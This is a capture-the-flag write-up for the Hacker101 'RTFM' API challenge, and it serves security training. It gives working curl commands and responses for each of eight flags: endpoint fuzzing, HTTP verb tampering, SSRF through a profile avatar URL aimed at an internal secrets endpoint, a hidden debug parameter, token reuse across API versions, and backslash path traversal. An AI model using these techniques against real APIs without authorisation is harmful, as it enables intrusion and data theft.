# Hacker101 CTF — RTFM (Moderate)

**Platform:** HackerOne CTF  
**Challenge:** RTFM  
**Difficulty:** Moderate  
**Category:** Web / API Hacking / SSRF / Path Traversal  
**Flags:** 8

---

## Overview

RTFM is an API hacking challenge centered around a RESTful JSON API. The application runs behind an OpenResty reverse proxy and exposes two API versions (`/api/v1/` and `/api/v2/`) with differing authentication mechanisms and feature sets. The challenge teaches API enumeration, HTTP verb tampering, SSRF, hidden parameter discovery, session reuse across API versions, and path traversal.

**Server:** openresty/1.29.2.4 (server-name: Neptune)

The homepage reveals only a single hint:

```
API base located at /api/v1/
```

All interaction occurs through the JSON API. There is no frontend UI beyond the root page.

---

## Reconnaissance

### Application Behavior

The API is structured into two versions:

| Version | Auth Header | Notes |
|---------|------------|-------|
| v1 | `X-Token` | Token obtained via `/api/v1/user/login` |
| v2 | `X-Session` | Uses the same token value as v1 |

Key v1 endpoints (discovered via fuzzing `/api/v1/`):

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/v1/user` | `GET` | View user details (requires X-Token) |
| `/api/v1/user` | `POST` | Create user account (no auth) |
| `/api/v1/user` | `PUT` | Update user profile (requires X-Token) |
| `/api/v1/user/login` | `POST` | Login — returns token |
| `/api/v1/status` | `GET` | Service status |
| `/api/v1/config` | `GET` | Server configuration |
| `/api/v1/secrets` | `GET` | Internal secrets (IP-restricted) |
| `/api/v1/user/posts/{id}` | `GET` | View posts (requires X-Token) |
| `/api/v1/post-analytics/{hash}` | `GET` | Post analytics |

Key v2 endpoints (from `/api/v2/swagger.json`):

| Endpoint | Method | Auth |
|----------|--------|------|
| `/api/v2/user` | `GET` / `POST` | X-Session |
| `/api/v2/user/login` | `POST` | None |
| `/api/v2/admin/user-list` | `GET` | X-Session |
| `/api/v2/user/posts/{id}` | `GET` | X-Session |

### Technology Stack

- **Reverse proxy:** openresty/1.29.2.4
- **API framework:** Swagger/OpenAPI 2.0
- **Data format:** JSON

---

## Flag 0 — Swagger Documentation Discovery

**Method:** Directory fuzzing to discover `/api/v2/swagger.json`

**Hint:** *"Wordlists will help you find something to do"*

### The Vulnerability

The homepage only reveals the v1 API base path. Fuzzing the root with an API endpoint wordlist uncovers `/api/v2/swagger.json`, a full OpenAPI specification document. This swagger file documents the entire v2 API — including admin endpoints — and contains the first flag.

### The Attack

```bash
curl -s 'https://TARGET.ctf.hacker101.com/api/v2/swagger.json' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])"
```

**Response:**

```json
{
  "swagger": "2.0",
  "flag": "^FLAG^<redacted>$FLAG$",
  "info": {
    "description": "Simple User API",
    "version": "1.0.0",
    "title": "User API"
  },
  "paths": {
    "/api/v2/user": { ... },
    "/api/v2/user/login": { ... },
    "/api/v2/admin/user-list": { ... },
    "/api/v2/user/posts/{id}": { ... }
  }
}
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** OpenAPI/Swagger documentation is often unintentionally exposed in production. The swagger file not only leaked a flag but also mapped the entire v2 attack surface — including the admin-only `/api/v2/admin/user-list` endpoint that would have been difficult to guess.

---

## Flag 1 — Config Endpoint Discovery

**Method:** Fuzzing `/api/v1/` for hidden endpoints

**Hint:** *(none — discovered through enumeration of Flag0's swagger paths)*

### The Vulnerability

Fuzzing the `/api/v1/` path reveals the `/api/v1/config` endpoint, which returns server configuration details including a `private_key` field containing the flag.

### The Attack

```bash
curl -s 'https://TARGET.ctf.hacker101.com/api/v1/config'
```

**Response:**

```json
{
  "server": "Neptune",
  "version": "1.3.94",
  "private_key": "^FLAG^<redacted>$FLAG$"
}
```

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Thorough endpoint enumeration is essential when attacking APIs. Fuzzing the base API path with resource-oriented wordlists (`api-endpoints-res.txt`) reveals endpoints that are not documented or linked from any page. The config endpoint had no authentication requirement and exposed internal infrastructure details.

---

## Flag 2 — User Registration (POST Instead of GET)

**Method:** `POST /api/v1/user` with `username` and `password` parameters

**Hint:** *"If a GET doesn't do anything, try a different HTTP verb."*

### The Vulnerability

A `GET` request to `/api/v1/user` returns `"error":"X-Token header authentication missing"`. However, sending a `POST` request to the same endpoint with form-encoded `username` and `password` parameters creates a new user account and returns the flag — no authentication required.

### The Attack

```bash
curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/api/v1/user' \
  -d 'username=attacker&password=attacker'
```

**Response:**

```json
{
  "username": "attacker",
  "flag": "^FLAG^<redacted>$FLAG$",
  "message": "User created go to /api/v1/user/login to login"
}
```

> **Flag 2:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** HTTP verbs matter. `GET` is read-only, `POST` creates, `PUT` updates, `DELETE` removes. When a GET returns an auth error, try POST/PUT — the endpoint may support multiple operations with different authorization requirements. Always test all HTTP methods on every endpoint.

---

## Flag 3 — SSRF via Avatar Field

**Method:** `PUT /api/v1/user` with `X-Token` and `avatar=<internal URL>` to perform SSRF against `/api/v1/secrets`

**Hint:** *"Maybe you can edit your profile? but what fields can you change?"*

### The Vulnerability

After logging in, a `PUT` to `/api/v1/user` allows updating profile fields. The only updatable field (discovered via parameter fuzzing) is `avatar`, which must be an HTTP/HTTPS URL. The server fetches the URL server-side and parses it as an image. If the URL points to an internal API endpoint that returns JSON (not an image), the server returns the raw response in an error message, achieving Server-Side Request Forgery.

### The Attack

**Step 1 — Login to obtain a token:**

```bash
curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/api/v1/user/login' \
  -d 'username=attacker&password=attacker'
```

**Response:**

```json
{"token":"<TOKEN>"}
```

**Step 2 — SSRF to internal `/api/v1/secrets`:**

```bash
TOKEN="<TOKEN>"
curl -s -X PUT \
  "https://TARGET.ctf.hacker101.com/api/v1/user" \
  -H "X-Token: $TOKEN" \
  -d 'avatar=http://localhost/api/v1/secrets'
```

**Response:**

```json
{
  "error": "Non Image detected",
  "example_data": "{\"private_key\":\"^FLAG^<redacted>$FLAG$\"}"
}
```

> **Flag 3:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** SSRF occurs whenever a server fetches a user-supplied URL. Even though the endpoint expects an image, the error message leaks the raw response body. Always validate that fetched URLs point to expected content types and block requests to internal hosts (localhost, 127.0.0.1, private IPs). The `/api/v1/secrets` endpoint was IP-restricted against direct access but reachable via SSRF from localhost.

---

## Flag 4 — Hidden verbose Parameter

**Method:** `GET /api/v1/status?verbose=1` to reveal hidden data

**Hint:** *"Sometimes developers hide extra features into a page… but how can you access it?"*

### The Vulnerability

The `/api/v1/status` endpoint returns `{"live":true}` by default. Adding a `verbose` query parameter (discovered via parameter fuzzing) causes the endpoint to return additional data containing the flag. The `verbose` parameter is undocumented and not referenced in any API response.

### The Attack

```bash
curl -s 'https://TARGET.ctf.hacker101.com/api/v1/status?verbose=1'
```

**Response:**

```json
{
  "live": true,
  "data": "^FLAG^<redacted>$FLAG$"
}
```

> **Flag 4:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Debug and verbose parameters are common sources of information disclosure. Developers often add debugging-friendly query parameters during development and forget to remove them in production. Fuzzing for undocumented parameters (`?FUZZ=1`) on every endpoint should be part of standard API testing.

---

## Flag 5 — v2 Admin Endpoint (Session Reuse)

**Method:** `GET /api/v2/admin/user-list` with `X-Session` header set to the v1 token

**Hint:** *"Have you read the new version of the API's documentations?"*

### The Vulnerability

The swagger file (Flag0) documents a v2 admin endpoint `/api/v2/admin/user-list` that requires an `X-Session` header. Even though the v1 authentication uses `X-Token`, the same token value works as `X-Session` on v2 endpoints. The admin endpoint lists all registered users, and the first user's username field contains the flag.

### The Attack

```bash
TOKEN="<TOKEN>"
curl -s \
  'https://TARGET.ctf.hacker101.com/api/v2/admin/user-list' \
  -H "X-Session: $TOKEN"
```

**Response:**

```json
{
  "users": [
    { "username": "^FLAG^<redacted>$FLAG$" },
    { "username": "attacker" }
  ]
}
```

> **Flag 5:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** API versioning doesn't imply separate authentication scopes. If v1 tokens authenticate v2 endpoints, any v1 user can access v2 admin functionality. The swagger file disclosed the admin endpoint path and the required header name (`X-Session`). Always test whether credentials from one API version are accepted by another.

---

## Flag 6 — Cross-Version Session Reuse (v1 Endpoint, v2 Documentation)

**Method:** Access `/api/v1/user/posts/1` with `X-Token` — a v1 endpoint discovered from v2 swagger docs

**Hint:** *"How can you use the same session across multiple different instances and versions?"*

### The Vulnerability

The v2 swagger documents `/api/v2/user/posts/{id}` but the v2 endpoint returns `"error":"Invalid Session"`. However, the same path exists on v1 at `/api/v1/user/posts/1` and accepts the v1 `X-Token`. The v2 swagger serves as documentation for endpoints that also exist on v1. The post content contains the flag.

### The Attack

```bash
TOKEN="<TOKEN>"
curl -s \
  'https://TARGET.ctf.hacker101.com/api/v1/user/posts/1' \
  -H "X-Token: $TOKEN"
```

**Response:**

```json
{
  "id": 1,
  "post": "You got the Post: ^FLAG^<redacted>$FLAG$",
  "analytics": "/api/v1/post-analytics/3c8a6664b8203c2e0b2b24972ccf5ce3"
}
```

> **Flag 6:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** API documentation from one version often applies to other versions. Always test v2-documented paths on v1 (and vice versa). The v2 swagger served as a roadmap for both API versions. The response also reveals the analytics endpoint path, which leads to Flag7.

---

## Flag 7 — Path Traversal in Analytics Endpoint

**Method:** Path traversal via `..\` in `/api/v1/post-analytics/` to access the `private` directory

**Hint:** *"Some features were never quite finished properly in some versions"*

### The Vulnerability

The analytics endpoint `/api/v1/post-analytics/{hash}` returns view statistics for a post. By using the path traversal sequence `..\` (backslash), it's possible to escape the analytics directory and enumerate sibling directories. Fuzzing the traversed path reveals a `/private` directory that contains the final flag.

The backslash (`\`) path separator is notable — the server appears to be running on a Windows backend or a framework that accepts both `/` and `\` as path separators.

### The Attack

**Step 1 — Discover sibling directories:**

```bash
curl -s 'https://TARGET.ctf.hacker101.com/api/v1/post-analytics/..%5C'
```

**Response reveals available paths, including `/public` and `/private`.**

**Step 2 — Access the private directory:**

```bash
curl -s 'https://TARGET.ctf.hacker101.com/api/v1/post-analytics/..%5Cprivate'
```

**Response:**

```json
{
  "flag": "^FLAG^<redacted>$FLAG$"
}
```

> **Flag 7:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Path traversal vulnerabilities occur when user input is used to construct file paths without sanitization. The analytics endpoint concatenated the `{hash}` segment directly into a directory path. Using `..\` escaped the intended directory. Always normalize and validate path inputs — reject sequences like `..`, `..\`, and `%2e%2e`. Also, never expose internal directory structures through API paths.

---

## Complete Flag List

| Flag | Hash | Vulnerability | Technique |
|:----:|------|:-------------|-----------|
| 0 | `<redacted>` | Exposed swagger docs | Fuzzed root for API paths → discovered `/api/v2/swagger.json` |
| 1 | `<redacted>` | Exposed config endpoint | Fuzzed `/api/v1/` → discovered `/api/v1/config` |
| 2 | `<redacted>` | Missing auth on POST | `POST /api/v1/user` with username/password (no token needed) |
| 3 | `<redacted>` | SSRF via avatar upload | `PUT /api/v1/user` with `avatar=http://localhost/api/v1/secrets` |
| 4 | `<redacted>` | Hidden debug parameter | `GET /api/v1/status?verbose=1` |
| 5 | `<redacted>` | v2 admin endpoint + token reuse | `GET /api/v2/admin/user-list` with `X-Session: <v1_token>` |
| 6 | `<redacted>` | Cross-version endpoint access | `GET /api/v1/user/posts/1` (v1 path documented in v2 swagger) |
| 7 | `<redacted>` | Path traversal | `GET /api/v1/post-analytics/..%5Cprivate` |

---

## Key Takeaways

1. **Fuzz everything.** Flag0 (swagger.json) and Flag1 (config) were both discovered through endpoint fuzzing. Start with the root, then fuzz each discovered path prefix. Use different wordlists for different contexts (files vs. API resources).

2. **HTTP verb matters.** Flag2 required switching from GET to POST on the same endpoint. Always test GET, POST, PUT, PATCH, DELETE, and OPTIONS on every API endpoint.

3. **SSRF is a force multiplier.** Flag3 turned a simple avatar update into SSRF against an internal secrets endpoint. Any feature that fetches URLs server-side — avatars, webhooks, importers, link previews — is a potential SSRF vector.

4. **Debug parameters don't disappear.** Flag4's `verbose` parameter was likely a development convenience that was never removed. Fuzz for common debug parameters: `verbose`, `debug`, `test`, `admin`, `show`, `raw`, `pretty`.

5. **API documentation is a treasure map.** The v2 swagger.json (Flag0) disclosed every endpoint, every parameter, and every required header for the entire v2 API. Swagger/OpenAPI files should never be exposed in production.

6. **Version boundaries are not security boundaries.** Flags 5 and 6 demonstrate that v1 tokens work on v2 and v2-documented paths exist on v1. Never assume that authentication scopes or feature availability differ between API versions.

7. **Path traversal is alive and well.** Flag7 abused `..\` in a Windows-style path context. Even simple string concatenation in path construction (`/data/{user_input}/`) is a traversal risk. Always validate and normalize user-supplied path segments.

8. **Flag placement varies.** Flags appeared in response bodies, error messages, usernames, configuration values, and redirect parameters. Read every response in its entirety — including error details and HTTP headers.

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — API Hacking (Video)](https://www.hacker101.com/sessions/api)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
